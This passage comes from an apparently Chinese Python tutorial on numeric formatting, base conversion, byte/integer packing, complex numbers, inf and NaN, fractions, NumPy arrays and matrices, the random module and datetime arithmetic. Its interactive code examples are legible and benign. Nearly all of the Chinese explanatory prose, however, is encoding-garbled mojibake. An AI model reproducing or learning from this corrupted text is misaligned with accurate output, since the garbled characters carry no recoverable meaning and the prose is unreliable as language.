1234.6' >>> '%-10.1f' % x '1234.6 ' >>> äºŒ/å…«/åå…­è¿›åˆ¶æ•´æ•° éœ€è¦è½¬æ¢æˆ–è€…è¾“å‡ºä½¿ç”¨äºŒè¿›åˆ¶ï¼Œå…«è¿›åˆ¶æˆ–åå…­è¿›åˆ¶è¡¨ç¤ºçš„æ•´æ•° bin, åè¿›åˆ¶æ•´æ•°è½¬äºŒè¿›åˆ¶: >>> x = 1234 >>> bin(x) '0b10011010010' oct, åè¿›åˆ¶æ•´æ•°è½¬å…«è¿›åˆ¶: >>> oct(x) '0o2322' hex, åè¿›åˆ¶æ•´æ•°è½¬åå…­è¿›åˆ¶:: >>> hex(x) '0x4d2' >>> å¦‚æœä½ ä¸æƒ³è¾“å‡º 0b , 0o æˆ–è€… 0x çš„å‰ç¼€çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ format() å‡½æ•°: >>> format(x, 'b') '10011010010' >>> format(x, 'o') '2322' >>> format(x, 'x') '4d2' >>> å¦‚æœä½ æƒ³äº§ç”Ÿä¸€ä¸ªæ— ç¬¦å·å€¼ï¼Œä½ éœ€è¦å¢åŠ ä¸€ä¸ªæŒ‡ç¤ºæœ€å¤§ä½é•¿åº¦çš„å€¼ã€‚æ¯”å¦‚ä¸ºäº†æ˜¾ç¤º 32 ä½çš„å€¼: >>> x = -1234 >>> format(2**32 + x, 'b') '11111111111111111111101100101110' >>> format(2**32 + x, 'x') 'fffffb2e' >>> ä¸ºäº†ä»¥ä¸åŒçš„è¿›åˆ¶è½¬æ¢æ•´æ•°å­—ç¬¦ä¸²ï¼Œç®€å•çš„ä½¿ç”¨å¸¦æœ‰è¿›åˆ¶çš„ int() å‡½æ•°: >>> int('4d2', 16) 1234 >>> int('10011010010', 2) 1234 >>> Python æŒ‡å®šå…«è¿›åˆ¶æ•°çš„è¯­æ³•è·Ÿå…¶ ä»–è¯­è¨€ç¨æœ‰ä¸åŒã€‚æ¯”å¦‚ï¼Œå¦‚æœä½ åƒä¸‹é¢è¿™æ ·æŒ‡å®šå…«è¿›åˆ¶ï¼Œä¼šå‡ºç°è¯­æ³•é”™è¯¯: >>> import os >>> os.chmod('script.py', 0755) File \"<stdin>\", line 1 os.chmod('script.py', 0755) &#94; SyntaxError: invalid token >>> éœ€ç¡®ä¿å…«è¿›åˆ¶æ•°çš„å‰ç¼€æ˜¯ 0o os.chmod('script.py', 0o755) å­—èŠ‚åˆ°å¤§æ•´æ•°çš„æ‰“åŒ…ä¸è§£åŒ… æœ‰ä¸€ä¸ªå­—èŠ‚å­—ç¬¦ä¸²å¹¶æƒ³å°†å®ƒè§£å‹æˆä¸€ä¸ªæ•´æ•°ã€‚æˆ–è€…ï¼Œä½ éœ€è¦å°†ä¸€ä¸ªå¤§æ•´æ•°è½¬æ¢ä¸º ä¸€ä¸ªå­—èŠ‚å­—ç¬¦ä¸²ã€‚ å°† bytes è§£æä¸ºæ•´æ•°ï¼Œä½¿ç”¨ int.from_bytes() æ–¹æ³•ï¼Œå¹¶åƒä¸‹é¢è¿™æ ·æŒ‡å®šå­—èŠ‚ é¡ºåº: # 128 bit , 16 å…ƒç´  data = b'\\x00\\x124V\\x00x\\x90\\xab\\x00\\xcd\\xef\\x01\\x00#\\x004' >>> len(data) 16 >>> int.from_bytes(data, 'little') 69120565665751139577663547927094891008 >>> int.from_bytes(data, 'big') 94522842520747284487117727783387188 >>> äº†å°†ä¸€ä¸ªå¤§æ•´æ•°è½¬æ¢ä¸ºä¸€ä¸ªå­—èŠ‚å­—ç¬¦ä¸²ï¼Œä½¿ç”¨ int.to_bytes() æ–¹æ³•ï¼Œå¹¶åƒä¸‹é¢ è¿™æ ·æŒ‡å®šå­—èŠ‚æ•°å’Œå­—èŠ‚é¡ºåº: >>> x = 94522842520747284487117727783387188 >>> x.to_bytes(16, 'big') b'\\x00\\x124V\\x00x\\x90\\xab\\x00\\xcd\\xef\\x01\\x00#\\x004' >>> x.to_bytes(16, 'little') b'4\\x00#\\x00\\x01\\xef\\xcd\\x00\\xab\\x90x\\x00V4\\x12\\x00' >>> å¤§æ•´æ•°å’Œå­—èŠ‚å­—ç¬¦ä¸²ä¹‹é—´çš„è½¬æ¢æ“ä½œå¹¶ä¸å¸¸è§ã€‚ ç„¶è€Œï¼Œåœ¨ä¸€äº›åº”ç”¨é¢†åŸŸæœ‰æ—¶å€™ä¹Ÿä¼š å‡ºç°ï¼Œæ¯”å¦‚å¯†ç å­¦æˆ–è€…ç½‘ç»œã€‚ ä¾‹å¦‚ï¼ŒIPv6 ç½‘ç»œåœ°å€ä½¿ç”¨ä¸€ä¸ª 128 ä½çš„æ•´æ•°è¡¨ç¤ºã€‚ å¦‚æœ ä½ è¦ä»ä¸€ä¸ªæ•°æ®è®°å½•ä¸­æå–è¿™æ ·çš„å€¼çš„æ—¶å€™ï¼Œä½ å°±ä¼šé¢å¯¹è¿™æ ·çš„é—®é¢˜ã€‚ ä½œä¸ºä¸€ç§æ›¿ä»£æ–¹æ¡ˆï¼Œä½ å¯èƒ½æƒ³ä½¿ç”¨ struct æ¨¡å—æ¥è§£å‹å­—èŠ‚ã€‚ è¿™æ ·ä¹Ÿè¡Œå¾—é€šï¼Œä¸è¿‡åˆ©ç”¨ struct æ¨¡å—æ¥è§£å‹å¯¹äºæ•´æ•°çš„å¤§å°æ˜¯æœ‰é™åˆ¶çš„ã€‚ å› æ­¤ï¼Œä½ å¯ èƒ½æƒ³è§£å‹å¤šä¸ªå­—èŠ‚ä¸²å¹¶å°†ç»“æœåˆå¹¶ä¸ºæœ€ç»ˆçš„ç»“æœ: >>> data b'\\x00\\x124V\\x00x\\x90\\xab\\x00\\xcd\\xef\\x01\\x00#\\x004' >>> import struct >>> hi, lo = struct.unpack('>QQ', data) >>> (hi << 64) + lo 94522842520747284487117727783387188 >>> å­—èŠ‚é¡ºåºè§„åˆ™ (little æˆ– big) ä»…ä»…æŒ‡å®šäº†æ„å»ºæ•´æ•°æ—¶çš„å­—èŠ‚çš„ä½ä½é«˜ä½æ’åˆ—æ–¹å¼ã€‚ æˆ‘ä»¬ä»ä¸‹é¢ç²¾å¿ƒæ„é€ çš„ 16 è¿›åˆ¶æ•°çš„è¡¨ç¤ºä¸­å¯ä»¥å¾ˆå®¹æ˜“çš„çœ‹å‡ºæ¥: >>> x = 0x01020304 >>> x.to_bytes(4, 'big') b'\\x01\\x02\\x03\\x04' >>> x.to_bytes(4, 'little') b'\\x04\\x03\\x02\\x01' >>> å¦‚æœä½ è¯•ç€å°†ä¸€ä¸ªæ•´æ•°æ‰“åŒ…ä¸ºå­—èŠ‚å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆå®ƒå°±ä¸åˆé€‚äº†ï¼Œä½ ä¼šå¾—åˆ°ä¸€ä¸ªé”™ è¯¯ã€‚ å¦‚æœéœ€è¦çš„è¯ï¼Œä½ å¯ä»¥ä½¿ç”¨ int.bit_length() æ–¹æ³•æ¥å†³å®šéœ€è¦å¤šå°‘å­—èŠ‚ä½æ¥å­˜å‚¨ è¿™ä¸ªå€¼ã€‚: >>> x = 523 ** 23 >>> x 335381300113661875107536852714019056160355655333978849017944067 >>> x.to_bytes(16, 'little') Traceback (most recent call last): File \"<stdin>\", line 1, in <module> OverflowError: int too big to convert >>> x.bit_length() 208 >>> nbytes, rem = divmod(x.bit_length(), 8) >>> if rem: ... nbytes += 1 ... >>> >>> x.to_bytes(nbytes, 'little') b'\\x03X\\xf1\\x82iT\\x96\\xac\\xc7c\\x16\\xf3\\xb9\\xcf...\\xd0' >>> å¤æ•° å¤æ•°å¯ä»¥ç”¨ä½¿ç”¨å‡½æ•° complex(real, imag) æˆ–è€…æ˜¯å¸¦æœ‰åç¼€ j çš„æµ®ç‚¹æ•°æ¥æŒ‡å®š: >>> a = complex(2, 4) >>> b = 3 - 5j >>> a (2+4j) >>> b (3-5j) >>> å¯¹åº”çš„å®éƒ¨ã€è™šéƒ¨å’Œå…±è½­å¤æ•°å¯ä»¥å¾ˆå®¹æ˜“çš„è·å–: >>> a.real 2.0 >>> a.imag 4.0 >>> a.conjugate() (2-4j) >>> æ‰€æœ‰å¸¸è§çš„æ•°å­¦è¿ç®—: >>> a + b (5-1j) >>> a * b (26+2j) >>> a / b (-0.4117647058823529+0.6470588235294118j) >>> abs(a) 4.47213595499958 >>> å¦‚æœè¦æ‰§è¡Œå…¶ä»–çš„å¤æ•°å‡½æ•°æ¯”å¦‚æ­£å¼¦ã€ä½™å¼¦æˆ–å¹³æ–¹æ ¹ï¼Œä½¿ç”¨ /docs/åç«¯/python/pythonæ ‡å‡†åº“/cmath æ¨¡å—: >>> import cmath >>> cmath.sin(a) (24.83130584894638-11.356612711218174j) >>> cmath.cos(a) (-11.36423470640106-24.814651485634187j) >>> cmath.exp(a) (-4.829809383269385-5.5920560936409816j) >>> Python ä¸­å¤§éƒ¨åˆ†ä¸æ•°å­¦ç›¸å…³çš„æ¨¡å—éƒ½èƒ½å¤„ç†å¤æ•°ã€‚ æ¯”å¦‚ä½¿ç”¨ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/numpy ï¼Œå¯ä»¥ å¾ˆå®¹æ˜“çš„æ„é€ ä¸€ä¸ªå¤æ•°æ•°ç»„å¹¶åœ¨è¿™ä¸ªæ•°ç»„ä¸Šæ‰§è¡Œå„ç§æ“ä½œ: >>> import numpy as np >>> a = np.array([2+3j, 4+5j, 6-7j, 8+9j]) >>> a array([ 2.+3.j, 4.+5.j, 6.-7.j, 8.+9.j]) >>> a + 2 array([ 4.+3.j, 6.+5.j, 8.-7.j, 10.+9.j]) >>> np.sin(a) array([ 9.15449915 -4.16890696j, -56.16227422 -48.50245524j, -153.20827755-526.47684926j, 4008.42651446-589.49948373j]) >>> Python çš„æ ‡å‡†æ•°å­¦å‡½æ•°ç¡®å®æƒ…å†µä¸‹å¹¶ä¸èƒ½äº§ç”Ÿå¤æ•°å€¼ï¼Œå› æ­¤ä½ çš„ä»£ç ä¸­ä¸å¯èƒ½ä¼š å‡ºç°å¤æ•°è¿”å›å€¼: >>> import math >>> math.sqrt(-1) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> ValueError: math domain error >>> å¦‚æœä½ æƒ³ç”Ÿæˆä¸€ä¸ªå¤æ•°è¿”å›ç»“æœï¼Œä½ å¿…é¡»æ˜¾ç¤ºçš„ä½¿ç”¨ cmath æ¨¡å—ï¼Œæˆ–è€…åœ¨æŸä¸ªæ”¯ æŒå¤æ•°çš„åº“ä¸­å£°æ˜å¤æ•°ç±»å‹çš„ä½¿ç”¨: >>> import cmath >>> cmath.sqrt(-1) 1j >>> æ— ç©·å¤§ä¸ NaN åˆ›å»ºæˆ–æµ‹è¯•æ­£æ— ç©·ã€è´Ÿæ— ç©·æˆ– NaN(éæ•°å­—) çš„æµ®ç‚¹æ•° Python å¹¶æ²¡æœ‰ç‰¹æ®Šçš„è¯­æ³•æ¥è¡¨ç¤ºè¿™äº›ç‰¹æ®Šçš„æµ®ç‚¹å€¼ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ float() æ¥åˆ› å»ºå®ƒä»¬: >>> a = float('inf') >>> b = float('-inf') >>> c = float('nan') >>> a inf >>> b -inf >>> c nan >>> ä¸ºäº†æµ‹è¯•è¿™äº›å€¼çš„å­˜åœ¨ï¼Œä½¿ç”¨ math.isinf() å’Œ math.isnan() å‡½æ•°: >>> math.isinf(a) True >>> math.isnan(c) True >>> æœ‰ä¸€äº›åœ° æ–¹éœ€è¦ä½ ç‰¹åˆ«æ³¨æ„ï¼Œç‰¹åˆ«æ˜¯è·Ÿæ¯”è¾ƒå’Œæ“ä½œç¬¦ç›¸å…³çš„æ—¶å€™ã€‚ æ— ç©·å¤§æ•°åœ¨æ‰§è¡Œæ•°å­¦è®¡ç®—çš„æ—¶å€™ä¼šä¼ æ’­: >>> a = float('inf') >>> a + 45 inf >>> a * 10 inf >>> 10 / a 0.0 >>> ä½†æ˜¯æœ‰äº›æ“ä½œæ—¶æœªå®šä¹‰çš„å¹¶ä¼šè¿”å›ä¸€ä¸ª NaN ç»“æœ: >>> a = float('inf') >>> a/a nan >>> b = float('-inf') >>> a + b nan >>> NaN å€¼ä¼šåœ¨æ‰€æœ‰æ“ä½œä¸­ä¼ æ’­ï¼Œè€Œä¸ä¼šäº§ç”Ÿå¼‚å¸¸: >>> c = float('nan') >>> c + 23 nan >>> c / 2 nan >>> c * 2 nan >>> math.sqrt(c) nan >>> NaN å€¼çš„ä¸€ä¸ªç‰¹åˆ«çš„åœ°æ–¹æ—¶å®ƒä»¬ä¹‹é—´çš„æ¯”è¾ƒæ“ä½œæ€»æ˜¯è¿”å› False: >>> c = float('nan') >>> d = float('nan') >>> c == d False >>> c is d False >>> æœ‰æ—¶å€™ç¨‹åºå‘˜æƒ³æ”¹å˜ Python é»˜è®¤è¡Œä¸ºï¼Œåœ¨è¿”å›æ— ç©·å¤§æˆ– NaN ç»“æœçš„æ“ä½œä¸­æŠ›å‡º å¼‚å¸¸ã€‚ fpectl æ¨¡å—å¯ä»¥ç”¨æ¥æ”¹å˜è¿™ç§è¡Œä¸ºï¼Œä½†æ˜¯å®ƒåœ¨æ ‡å‡†çš„ Python æ„å»ºä¸­å¹¶æ²¡æœ‰è¢« å¯ç”¨ï¼Œå®ƒæ˜¯å¹³å°ç›¸å…³çš„ï¼Œå¹¶ä¸”é’ˆå¯¹çš„æ˜¯ä¸“å®¶çº§ç¨‹åºå‘˜ã€‚ åˆ†æ•°è¿ç®— /docs/åç«¯/python/pythonæ ‡å‡†åº“/fractions æ¨¡å—å¯ä»¥è¢«ç”¨æ¥æ‰§è¡ŒåŒ…å«åˆ†æ•°çš„æ•°å­¦è¿ç®—: >>> from fractions import Fraction >>> a = Fraction(5, 4) >>> b = Fraction(7, 16) >>> print(a + b) 27/16 >>> print(a * b) 35/64 >>> # Getting numerator/denominator >>> c = a * b >>> c.numerator 35 >>> c.denominator 64 >>> # Converting to a float >>> float(c) 0.546875 >>> # Limiting the denominator of a value >>> print(c.limit_denominator(8)) 4/7 >>> # Converting a float to a fraction >>> x = 3.75 >>> y = Fraction(*x.as_integer_ratio()) >>> y Fraction(15, 4) >>> å¤§å‹æ•°ç»„è¿ç®— ä½¿ç”¨ /docs/åç«¯/python/pythonä¸‰æ–¹åº“/numpy .: >>> # Python lists >>> x = [1, 2, 3, 4] >>> y = [5, 6, 7, 8] >>> x * 2 [1, 2, 3, 4, 1, 2, 3, 4] >>> x + 10 Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: can only concatenate list (not \"int\") to list >>> x + y [1, 2, 3, 4, 5, 6, 7, 8] >>> # Numpy arrays >>> import numpy as np >>> ax = np.array([1, 2, 3, 4]) >>> ay = np.array([5, 6, 7, 8]) >>> ax * 2 array([2, 4, 6, 8]) >>> ax + 10 array([11, 12, 13, 14]) >>> ax + ay array([ 6, 8, 10, 12]) >>> ax * ay array([ 5, 12, 21, 32]) >>> NumPy ä¸­çš„æ ‡ é‡è¿ç®— (æ¯”å¦‚ ax * 2 æˆ– ax + 10 ) ä¼šä½œç”¨åœ¨æ¯ä¸€ä¸ªå…ƒç´ ä¸Š. å¦å¤–ï¼Œå½“ä¸¤ä¸ªæ“ä½œæ•°éƒ½æ˜¯ æ•°ç»„çš„æ—¶å€™æ‰§è¡Œå…ƒç´ å¯¹ç­‰ä½ç½®è®¡ç®—ï¼Œå¹¶æœ€ç»ˆç”Ÿæˆä¸€ä¸ªæ–°çš„æ•°ç»„. NumPy è¿˜ä¸ºæ•°ç»„æ“ä½œæä¾›äº†å¤§é‡çš„é€šç”¨å‡½æ•°ï¼Œè¿™äº›å‡½æ•°å¯ä»¥ä½œä¸º math æ¨¡å—ä¸­ç±»ä¼¼ å‡½æ•°çš„æ›¿ä»£: >>> np.sqrt(ax) array([ 1. , 1.41421356, 1.73205081, 2. ]) >>> np.cos(ax) array([ 0.54030231, -0.41614684, -0.9899925 , -0.65364362]) >>> åº•å±‚å®ç°ä¸­ï¼ŒNumPy æ•°ç»„ä½¿ç”¨äº† C æˆ–è€… Fortran è¯­è¨€çš„æœºåˆ¶åˆ†é…å†…å­˜ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ å®ƒä»¬æ˜¯ä¸€ä¸ªéå¸¸å¤§çš„è¿ç»­çš„å¹¶ç”±åŒç±»å‹æ•°æ®ç»„æˆçš„å†…å­˜åŒºåŸŸã€‚ æ‰€ä»¥ï¼Œä½ å¯ä»¥æ„é€ ä¸€ä¸ªæ¯” æ™®é€š Python åˆ—è¡¨å¤§çš„å¤šçš„æ•°ç»„ã€‚æ¯”å¦‚ï¼Œå¦‚æœä½ æƒ³æ„é€ ä¸€ä¸ª 10,000*10,000 çš„æµ®ç‚¹æ•°äºŒ ç»´ç½‘æ ¼ï¼Œå¾ˆè½»æ¾: >>> grid = np.zeros(shape=(10000,10000), dtype=float) å®ƒæ‰©å±• Python åˆ—è¡¨çš„ç´¢å¼•åŠŸèƒ½ - ç‰¹åˆ« æ˜¯å¯¹äºå¤šç»´æ•°ç»„: >>> a = np.array([[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12]]) >>> a array([[ 1, 2, 3, 4], [ 5, 6, 7, 8], [ 9, 10, 11, 12]]) >>> # Select row 1 >>> a[1] array([5, 6, 7, 8]) >>> # Select column 1 >>> a[:,1] array([ 2, 6, 10]) çŸ©é˜µä¸çº¿æ€§ä»£æ•°è¿ç®— æ‰§è¡ŒçŸ©é˜µå’Œçº¿æ€§ä»£æ•°è¿ç®—ï¼Œæ¯”å¦‚çŸ©é˜µä¹˜æ³•ã€å¯»æ‰¾è¡Œåˆ—å¼ã€æ±‚è§£çº¿æ€§æ–¹ç¨‹ç»„ç­‰ ç­‰ NumPy åº“( /docs/åç«¯/python/pythonä¸‰æ–¹åº“/numpy )æœ‰ä¸€ä¸ªçŸ©é˜µå¯¹è±¡å¯ä»¥ç”¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜: >>> import numpy as np >>> m = np.matrix([[1,-2,3],[0,4,5],[7,8,-9]]) >>> m matrix([[ 1, -2, 3], [ 0, 4, 5], [ 7, 8, -9]]) >>> # Return transpose >>> m.T matrix([[ 1, 0, 7], [-2, 4, 8], [ 3, 5, -9]]) >>> # Return inverse >>> m.I matrix([[ 0.33043478, -0.02608696, 0.09565217], [-0.15217391, 0.13043478, 0.02173913], [ 0.12173913, 0.09565217, -0.0173913 ]]) >>> # Create a vector and multiply >>> v = np.matrix([[2],[3],[4]]) >>> v matrix([[2], [3], [4]]) >>> m * v matrix([[ 8], [32], [ 2]]) >>> å¯ä»¥åœ¨ numpy.linalg å­åŒ…ä¸­æ‰¾åˆ°æ›´å¤šçš„æ“ä½œå‡½æ•°: >>> import numpy.linalg >>> # Determinant >>> numpy.linalg.det(m) -229.99999999999983 >>> # Eigenvalues >>> numpy.linalg.eigvals(m) array([-13.11474312, 2.75956154, 6.35518158]) >>> # Solve for x in mx = v >>> x = numpy.linalg.solve(m, v) >>> x matrix([[ 0.96521739], [ 0.17391304], [ 0.46086957]]) >>> m * x matrix([[ 2.], [ 3.], [ 4.]]) >>> v matrix([[2], [3], [4]]) >>> éšæœºé€‰æ‹© ä»ä¸€ä¸ªåºåˆ—ä¸­éšæœºæŠ½å–è‹¥å¹²å…ƒç´ ï¼Œæˆ–è€…æƒ³ç”Ÿæˆå‡ ä¸ªéšæœºæ•° random æ¨¡å—æœ‰å¤§é‡çš„å‡½æ•°ç”¨æ¥äº§ç”Ÿéšæœºæ•°å’Œéšæœºé€‰æ‹©å…ƒç´ ã€‚ æ¯”å¦‚ï¼Œè¦æƒ³ä»ä¸€ä¸ªåº åˆ—ä¸­éšæœºçš„æŠ½å–ä¸€ä¸ªå…ƒç´ ï¼Œå¯ä»¥ä½¿ç”¨ random.choice: >>> import random >>> values = [1, 2, 3, 4, 5, 6] >>> random.choice(values) 2 >>> random.choice(values) 3 ä¸ºäº†æå–å‡º N ä¸ªä¸åŒå…ƒç´ çš„æ ·æœ¬ç”¨æ¥åšè¿›ä¸€æ­¥çš„æ“ä½œï¼Œå¯ä»¥ä½¿ç”¨ random.sample >>> random.sample(values, 2) [6, 2] >>> random.sample(values, 2) [4, 3] >>> random.sample(values, 3) [4, 3, 1] >>> random.sample(values, 3) [5, 4, 1] >>> ä»…ä»…åªæ˜¯æƒ³æ‰“ä¹±åºåˆ—ä¸­å…ƒç´ çš„é¡ºåºï¼Œå¯ä»¥ä½¿ç”¨ random.shuffle >>> random.shuffle(values) >>> values [2, 4, 6, 5, 3, 1] >>> random.shuffle(values) >>> values [3, 5, 2, 1, 6, 4] >>> ç”Ÿæˆéšæœºæ•´æ•°ï¼Œè¯·ä½¿ç”¨ random.randint >>> random.randint(0,10) 2 >>> random.randint(0,10) 5 >>> random.randint(0,10) 0 >>> random.randint(0,10) 7 >>> random.randint(0,10) 10 >>> random.randint(0,10) 3 >>> ä¸ºäº†ç”Ÿæˆ 0 åˆ° 1 èŒƒå›´å†…å‡åŒ€åˆ†å¸ƒçš„æµ®ç‚¹æ•°ï¼Œä½¿ç”¨ random.random >>> random.random() 0.9406677561675867 >>> random.random() 0.133129581343897 >>> random.random() 0.4144991136919316 >>> è·å– N ä½éšæœºä½ (äºŒè¿›åˆ¶) çš„æ•´æ•°ï¼Œä½¿ç”¨ random.getrandbits >>> random.getrandbits(200) 335837000776573622800628485064121869519521710558559406913275 >>> andom æ¨¡å—ä½¿ç”¨ Mersenne Twister ç®—æ³•æ¥è®¡ç®—ç”Ÿæˆéšæœºæ•°ã€‚ è¿™æ˜¯ä¸€ä¸ªç¡®å®šæ€§ç®— æ³•ï¼Œä½†æ˜¯ä½ å¯ä»¥é€šè¿‡ random.seed() å‡½æ•°ä¿®æ”¹åˆå§‹åŒ–ç§å­: random.seed() # Seed based on system time or os.urandom() random.seed(12345) # Seed based on integer given random.seed(b'bytedata') # Seed based on byte data random æ¨¡å—è¿˜åŒ…å«åŸºäºå‡åŒ€åˆ†å¸ƒã€é«˜æ–¯åˆ†å¸ƒå’Œå…¶ä»–åˆ†å¸ƒçš„ éšæœºæ•°ç”Ÿæˆå‡½æ•°ã€‚ æ¯”å¦‚ï¼Œrandom.uniform() è®¡ç®—å‡åŒ€åˆ†å¸ƒéšæœºæ•°ï¼Œrandom.gauss() è®¡ç®—æ­£æ€åˆ†å¸ƒéšæœºæ•°ã€‚ å¯¹äºå…¶ä»–çš„åˆ†å¸ƒæƒ…å†µè¯·å‚è€ƒåœ¨çº¿æ–‡æ¡£ã€‚ åœ¨ random æ¨¡å—ä¸­çš„å‡½æ•°ä¸åº”è¯¥ç”¨åœ¨å’Œå¯†ç å­¦ç›¸å…³çš„ç¨‹åºä¸­ã€‚ å¦‚æœä½ ç¡®å®éœ€è¦ç±»ä¼¼ çš„åŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨ ssl æ¨¡å—ä¸­ç›¸åº”çš„å‡½æ•°ã€‚ æ¯”å¦‚ï¼Œssl.RAND_bytes() å¯ä»¥ç”¨æ¥ç”Ÿæˆä¸€ ä¸ªå®‰å…¨çš„éšæœºå­—èŠ‚åºåˆ—ã€‚ åŸºæœ¬çš„æ—¥æœŸä¸æ—¶é—´è½¬æ¢ æ‰§è¡Œç®€å•çš„æ—¶é—´è½¬æ¢ï¼Œæ¯”å¦‚å¤©åˆ°ç§’ï¼Œå°æ—¶åˆ°åˆ†é’Ÿç­‰çš„è½¬æ¢ ä¸ºäº†æ‰§è¡Œä¸åŒæ—¶é—´å•ä½çš„è½¬æ¢å’Œè®¡ç®—ï¼Œè¯·ä½¿ç”¨ datetime æ¨¡å—ã€‚æ¯”å¦‚ï¼Œä¸ºäº†è¡¨ç¤ºä¸€ ä¸ªæ—¶é—´æ®µï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ª timedelta å®ä¾‹: >>> from datetime import timedelta >>> a = timedelta(days=2, hours=6) >>> b = timedelta(hours=4.5) >>> c = a + b >>> c.days 2 >>> c.seconds 37800 >>> c.seconds / 3600 10.5 >>> c.total_seconds() / 3600 58.5 >>> å¦‚æœä½ æƒ³è¡¨ç¤ºæŒ‡å®šçš„æ—¥æœŸå’Œæ—¶é—´ï¼Œå…ˆåˆ›å»ºä¸€ä¸ª datetime å®ä¾‹ç„¶åä½¿ç”¨æ ‡å‡†çš„æ•°å­¦ è¿ç®—æ¥æ“ä½œå®ƒä»¬: >>> from datetime import datetime >>> a = datetime(2012, 9, 23) >>> print(a + timedelta(days=10)) 2012-10-03 00:00:00 >>> >>> b = datetime(2012, 12, 21) >>> d = b - a >>> d.days 89 >>> now = datetime.today() >>> print(now) 2012-12-21 14:54:43.094063 >>> print(now + timedelta(minutes=10)) 2012-12-21 15:04:43.094063 >>> è®¡ç®—çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ datetime ä¼šè‡ªåŠ¨å¤„ç†é—°å¹´: >>> a = datetime(2012, 3, 1) >>> b = datetime(2012, 2, 28) >>> a - b datetime.timedelta(2) >>> (a - b).days 2 >>> c = datetime(2013, 3, 1) >>> d = datetime(2013, 2, 28) >>> (c - d).days 1 >>> å¯¹å¤§å¤šæ•°åŸºæœ¬çš„æ—¥æœŸå’Œæ—¶é—´å¤„ç†é—®é¢˜ï¼Œdatetime æ¨¡å—å·²ç»è¶³å¤Ÿäº†ã€‚ å¦‚æœä½ éœ€è¦æ‰§ è¡Œæ›´åŠ å¤æ‚çš„æ—¥æœŸæ“ä½œï¼Œæ¯”å¦‚å¤„ç†æ—¶åŒºï¼Œæ¨¡ç³Šæ—¶é—´èŒƒå›´ï¼ŒèŠ‚å‡æ—¥è®¡ç®—ç­‰ç­‰ï¼Œå¯ä»¥è€ƒè™‘ä½¿ ç”¨ dateutil æ¨¡å— è®¸å¤šç±»ä¼¼çš„æ—¶é—´è®¡ç®—å¯ä»¥ä½¿ç”¨ dateutil.relativedelta() å‡½æ•°ä»£æ›¿ã€‚ ä½†æ˜¯ï¼Œæœ‰ä¸€ ç‚¹éœ€è¦æ³¨æ„çš„å°±æ˜¯ï¼Œå®ƒä¼šåœ¨å¤„ç†æœˆä»½ (è¿˜æœ‰å®ƒä»¬çš„å¤©æ•°å·®è·) çš„æ—¶å€™å¡«å……é—´éš™ , å³æœ‰äº›æœˆæœ‰30å¤©, æœ‰äº›æœ‰31å¤©: >>> a = datetime(2012, 9, 23) >>> a + timedelta(months=1) Traceback (most recent call last): File \"<stdin>\", line 1, in <module> TypeError: 'months' is an invalid keyword argument for this function >>> >>> from dateutil.relativedelta import relativedelta >>> a + relativedelta(months=+1) datetime.datetime(2012, 10, 23, 0, 0) >>> a + relativedelta(months=+4) datetime.datetime(2013, 1, 23, 0, 0) >>> >>> # Time between two dates >>> b = datetime(2012, 12, 21) >>> d = b - a >>> d datetime.timedelta(89) >>> d = relativedelta(b, a) >>> d relativedelta(months=+2, days=+28) >>> d.months 2 >>> d.days 28 >>> è®¡ç®—æœ€åä¸€ä¸ªå‘¨äº”çš„æ—¥æœŸ éœ€è¦æŸ¥æ‰¾æ˜ŸæœŸä¸­æŸä¸€å¤©æœ€åå‡ºç°çš„æ—¥æœŸï¼Œæ¯”å¦‚æ˜ŸæœŸäº” è®¡ç®—å½“å‰æœˆä»½çš„æ—¥æœŸèŒƒå›´ åœ¨å½“å‰æœˆä»½ä¸­å¾ªç¯æ¯ä¸€å¤©ï¼Œæƒ³æ‰¾åˆ°ä¸€ä¸ªè®¡ç®—è¿™ä¸ªæ—¥æœŸèŒƒå›´çš„é«˜æ•ˆæ–¹ æ³•ã€‚ åœ¨è¿™æ ·çš„æ—¥æœŸä¸Šå¾ªç¯å¹¶éœ€è¦äº‹å…ˆæ„é€ ä¸€ä¸ªåŒ…å«æ‰€æœ‰æ—¥æœŸçš„åˆ—è¡¨ã€‚ ä½ å¯ä»¥å…ˆè®¡ç®—å‡º å¼€å§‹æ—¥æœŸå’Œç»“æŸæ—¥æœŸï¼Œç„¶ååœ¨ä½ æ­¥è¿›çš„æ—¶å€™ä½¿ç”¨ datetime.timedelta å¯¹è±¡é€’å¢è¿™ä¸ªæ—¥ æœŸå˜é‡å³å¯ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªæ¥å—ä»»æ„ datetime å¯¹è±¡å¹¶è¿”å›ä¸€ä¸ªç”±å½“å‰æœˆä»½å¼€å§‹æ—¥å’Œä¸‹ä¸ªæœˆå¼€å§‹æ—¥ ç»„æˆçš„å…ƒç»„å¯¹è±¡: from datetime import datetime, date, timedelta import calendar def get_month_range(start_date=None): if start_date is None: start_date = date.today().replace(day=1) _, days_in_month = calendar.monthrange(start_date.year, start_date.month) end_date = start_date + timedelta(days=days_in_month) return (start_date, end_date) å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ—¥æœŸ åº”ç”¨ç¨‹åºæ¥å—å­—ç¬¦ä¸²æ ¼å¼çš„è¾“å…¥ï¼Œä½†æ˜¯ä½ æƒ³å°†å®ƒä»¬è½¬æ¢ä¸º datetime å¯¹è±¡ä»¥ä¾¿ åœ¨ä¸Šé¢æ‰§è¡Œéå­—ç¬¦ä¸²æ“ä½œã€‚ ä½¿ç”¨ Python çš„æ ‡å‡†æ¨¡å— datetime å¯ä»¥å¾ˆå®¹æ˜“çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æ¯”å¦‚: >>> from datetime import datetime >>> text = '2012-09-20' >>> y = datetime.strptime(text, '%Y-%m-%d') >>> z = datetime.now() >>> diff = z - y >>> diff datetime.timedelta(3, 77824, 177393) >>> datetime.strptime() æ–¹æ³•æ”¯æŒå¾ˆå¤šçš„æ ¼å¼åŒ–ä»£ç ï¼Œæ¯”å¦‚ 